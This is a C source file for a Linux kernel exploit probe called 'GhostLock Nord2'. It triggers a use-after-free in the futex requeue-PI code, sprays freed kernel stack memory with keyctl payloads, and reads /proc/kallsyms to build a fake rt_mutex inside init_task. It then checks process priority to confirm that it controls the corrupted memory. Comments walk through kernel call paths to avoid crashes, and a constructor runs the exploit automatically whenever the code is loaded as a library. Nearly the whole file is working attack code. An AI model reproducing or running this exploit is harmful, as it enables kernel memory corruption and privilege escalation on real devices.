/*
 * GhostLock Nord2 - Safe UAF trigger via owner UNLOCK
 *
 * Instead of sched_setattr (which always crashes with sprayed stack),
 * use the owner thread's FUTEX_UNLOCK_PI as the trigger.
 *
 * When owner unlocks f_pi_target, the kernel walks the PI chain to
 * boost the next waiter. This reads pi_blocked_on → freed waiter.
 * 
 * The owner UNLOCK happens AFTER our keyctl spray puts fake data on stack.
 * 
 * The key difference: FUTEX_UNLOCK_PI calls remove_waiter which 
 * dequeues the waiter from the lock's rb-tree WITHOUT calling
 * rt_mutex_adjust_prio_chain. So it only reads waiter->lock to get
 * the rb-tree root, not to dereference the owner.
 * 
 * Actually, we need to verify this path is different...
 * 
 * From kernel 4.14 futex_unlock_pi path:
 * futex_unlock_pi → wake_futex_pi → rt_mutex_futex_unlock
 *   → rt_mutex_slowunlock → mark_wakeup_next_waiter
 *   → rt_mutex_adjust_prio(task) → rt_mutex_setprio(p, pi_task)
 *   where pi_task = task_top_pi_waiter(p)->task
 *   = top of p->pi_waiters rb-tree → reads waiter->pi_tree entry
 * 
 * This ALSO reads waiter fields but differently.
 * 
 * The simplest safe trigger: just have another thread TRY to lock the futex.
 * FUTEX_LOCK_PI on f_pi_target → tries to acquire the lock → finds it taken →
 * calls task_blocks_on_rt_mutex → rt_mutex_adjust_prio_chain → reads pi_blocked_on
 * 
 * With pi_blocked_on pointing to freed waiter:
 * rt_mutex_adjust_prio_chain reads waiter->lock then rt_mutex_owner(lock)
 * 
 * With lock=init_task: rt_mutex_owner = *(init_task+0x18) = some ptr
 * Following that ptr as a task_struct and reading pi_lock, pi_blocked_on etc.
 * May eventually either find NULL and exit OR crash.
 * 
 * THE RESOLUTION: just try it. The original simple_uaf.so showed prio=-51
 * consistently without crash. That means the UAF DOES complete without crash
 * with the ORIGINAL data in the freed frame. The spray changes it.
 * 
 * Therefore: the spray MUST preserve the original waiter->lock value.
 * The only way to do this: DON'T spray at all for testing, or spray ONLY
 * the prio field.
 * 
 * For prio-only spray: we need to know EXACTLY where the waiter is on the stack.
 * 
 * NEW APPROACH: Use the probe pattern but detect via the /proc/stat prio change.
 * DON'T use sched_setattr (crashes). Instead, after spray, check if prio changed
 * from the baseline (-51, owner's RT50). If prio is now -78 (our SENTINEL), 
 * the spray hit the prio field.
 * 
 * The UAF is triggered by having the OWNER thread unlock and relock
 * (the original working approach that gave prio=-51).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include <linux/futex.h>
#include <time.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif
#ifndef SYS_add_key
#define SYS_add_key 217
#endif
#ifndef SYS_keyctl
#define SYS_keyctl 219
#endif
#define KEYCTL_UPDATE     2
#define KEYCTL_INVALIDATE 22
#define KPSZ 4096
#define SENTINEL 77

static uint32_t f_wait=0, f_pi_target=0, f_pi_chain=0;
static atomic_int g_tid=0, g_ready=0, g_waiting=0;
static atomic_int g_owner_started=0, g_owner_done=0;
static atomic_int g_do_spray=0, g_spray_done=0;
static atomic_int g_do_unlock=0;
static uint64_t g_init_task=0;

static uint64_t read_sym(const char *nm){
    FILE *f=fopen("/proc/kallsyms","r"); if(!f) return 0;
    uint64_t a=0; char t[8],s[256];
    while(fscanf(f,"%llx %s %255s",(unsigned long long*)&a,t,s)==3)
        if(!strcmp(s,nm)){fclose(f);return a;}
    fclose(f); return 0;
}
static int get_prio(pid_t tid){
    char p[64]; snprintf(p,sizeof(p),"/proc/%d/stat",(int)tid);
    FILE *f=fopen(p,"r"); if(!f) return -999;
    int pid; char c[256]; char st; long tmp;
    fscanf(f,"%d %s %c",&pid,c,&st);
    for(int i=0;i<14;i++) fscanf(f," %ld",&tmp);
    int prio=-999; fscanf(f," %d",&prio); fclose(f); return prio;
}

void *owner_fn(void *_){
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    struct sched_param sp={.sched_priority=50}; sched_setscheduler(0,SCHED_FIFO,&sp);
    syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_ready)) usleep(500);
    atomic_store(&g_owner_started,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_owner_done,1);
    /* Rapid unlock+lock loop — creates UAF trigger race window */
    while(!atomic_load(&g_do_unlock)) usleep(50);
    for(int i=0;i<200;i++){
        syscall(SYS_futex,&f_pi_target,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
        syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
        usleep(100);
    }
    return NULL;
}

void *waiter_fn(void *_){
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    atomic_store(&g_tid,(int)syscall(SYS_gettid));
    setpriority(PRIO_PROCESS,0,-5); /* prio 15 baseline */
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_ready,1);
    while(!atomic_load(&g_owner_started)) usleep(500);
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=60;
    atomic_store(&g_waiting,1);
    syscall(SYS_futex,&f_wait,FUTEX_WAIT_REQUEUE_PI,0,&ts,&f_pi_target,0);

    /* Stack freed. Spray via keyctl. */
    while(!atomic_load(&g_do_spray)) usleep(50);

    /* Build safe payload: fake_lock = selinux_enforcing (wait_lock=1 → trylock fails → exits) */
    /* selinux_enforcing as rt_mutex: wait_lock at +0 = 1 (locked!) → trylock fails → safe */
    /* Sequence: chain walk reads waiter->lock, tries raw_spin_trylock(lock->wait_lock) */
    /* If wait_lock is "locked" (bit[0]=1), spin is acquired = TRUE and we proceed */
    /* Actually raw_spin_lock (not trylock) is used — it will spin forever if locked! */
    /* 
     * ACTUALLY: rt_mutex_slowlock calls raw_spin_lock which SPINS if bit[0]=1.
     * That would hang the kernel.
     * 
     * Let's use a kernel address where word[0] = 0 (unlocked) but word[3] = 0 (owner=NULL).
     * Zero page? No, zero page isn't mapped in kernel.
     * Empty zero page (CONFIG_TRANSPARENT_HUGEPAGE)?
     * 
     * BEST: use init_task's pi_lock field.
     * init_task->pi_lock is at offset TASK_PI_LOCK_OFF = 0x9ec
     * pi_lock is raw_spinlock_t = initially 0 (unlocked)
     * At offset 0x9ec+0x00: wait_lock.raw_lock = 0 → unlocked ✓
     * At offset 0x9ec+0x18: ??? 
     * 0x9ec + 0x18 = 0xa04 = TASK_PI_WAITERS_OFF + 4
     * = init_task->pi_waiters.rb_root.rb_leftmost? = NULL? 
     * Actually TASK_PI_WAITERS_OFF=0xa00 from target.h:
     *   pi_waiters.rb_root.rb_node at +0x00 = NULL (no pi waiters for idle)
     *   pi_waiters.rb_leftmost at +0x08 = NULL
     * So: (init_task + 0x9ec) as rt_mutex:
     *   wait_lock at +0x00 = init_task->pi_lock = 0 ✓ (unlocked)
     *   waiters.rb_root at +0x08 = init_task->pi_waiters.rb_root... (should be empty)
     *   owner at +0x18 = init_task+0x9ec+0x18 = init_task+0xa04
     *     = probably pi_waiters.rb_leftmost + a bit = NULL if no waiters ✓
     * 
     * With NULL owner → rt_mutex_owner = NULL → chain walk exits!
     */
    uint64_t fake_lock_addr = g_init_task + 0x9ecULL; /* init_task->pi_lock as rt_mutex */
    uint8_t kp[KPSZ];
    for(int i=0;i<KPSZ;i+=8) *(uint64_t*)(kp+i) = fake_lock_addr;
    /* Place SENTINEL at every possible prio position (waiter->prio is at +0x18 from start) */
    for(int n=0; (n*8+0x18+4)<=KPSZ; n++)
        *(int32_t*)(kp + n*8 + 0x18) = SENTINEL;

    int keyid=(int)syscall(SYS_add_key,"user","gl_probe",kp,(size_t)KPSZ,(unsigned int)-4);
    if(keyid>0){
        for(int r=0;r<256;r++)
            syscall(SYS_keyctl,(long)KEYCTL_UPDATE,(long)keyid,(long)kp,(size_t)KPSZ,0L);
        syscall(SYS_keyctl,(long)KEYCTL_INVALIDATE,(long)keyid,0L,0L,0L);
    }
    atomic_store(&g_spray_done,1);

    syscall(SYS_futex,&f_pi_chain,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_owner_done)) usleep(500);
    return NULL;
}

int main(void){
    setvbuf(stderr,NULL,_IONBF,0);
    fprintf(stderr,"=== GhostLock Nord2 - Owner-Unlock UAF Probe ===\n");

    uint64_t stext=read_sym("_stext");
    if(!stext){fprintf(stderr,"[!] kptr_restrict\n");return 1;}
    g_init_task=stext+0x1c6d300ULL;
    fprintf(stderr,"[*] stext=%llx init_task=%llx\n",
            (unsigned long long)stext,(unsigned long long)g_init_task);

    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(2,&cs); sched_setaffinity(0,sizeof(cs),&cs);

    int found=0;
    for(int att=0;att<100&&!found;att++){
        f_wait=0; f_pi_target=0; f_pi_chain=0;
        atomic_store(&g_tid,0); atomic_store(&g_ready,0);
        atomic_store(&g_waiting,0); atomic_store(&g_owner_started,0);
        atomic_store(&g_owner_done,0);
        atomic_store(&g_do_spray,0); atomic_store(&g_spray_done,0);
        atomic_store(&g_do_unlock,0);

        pthread_t ot,wt;
        pthread_create(&ot,NULL,owner_fn,NULL);
        pthread_create(&wt,NULL,waiter_fn,NULL);
        while(!atomic_load(&g_waiting)||!atomic_load(&g_owner_started)) usleep(500);
        usleep(5000);

        /* Requeue waiter → pi_blocked_on gets set to freed waiter */
        syscall(SYS_futex,&f_wait,FUTEX_CMP_REQUEUE_PI,1,(void*)1UL,&f_pi_target,0);
        usleep(1000);

        /* Signal spray */
        atomic_store(&g_do_spray,1);
        while(!atomic_load(&g_spray_done)) usleep(500);
        usleep(2000);

        /* Signal owner to unlock (triggers UAF read) */
        atomic_store(&g_do_unlock,1);
        usleep(5000);

        /* Read prio */
        pid_t tid=(pid_t)atomic_load(&g_tid);
        int p=get_prio(tid);
        fprintf(stderr,"[att=%d] prio=%d",att,p);
        if(p < -1 && p != -999){
            int rt=-(p+1);
            fprintf(stderr," RT=%d%s\n",rt,rt==SENTINEL?" <-- CONTROLLED!":"");
            if(rt==SENTINEL) found=1;
        } else fprintf(stderr,"\n");

        pthread_detach(ot); pthread_detach(wt);
        usleep(20000);
    }
    if(found) fprintf(stderr,"\n[+] prio=SENTINEL confirmed via owner-unlock path!\n");
    else fprintf(stderr,"[-] keyctl spray didn't land on prio field\n");
    return found?0:1;
}
__attribute__((constructor)) static void _init(void){main();}
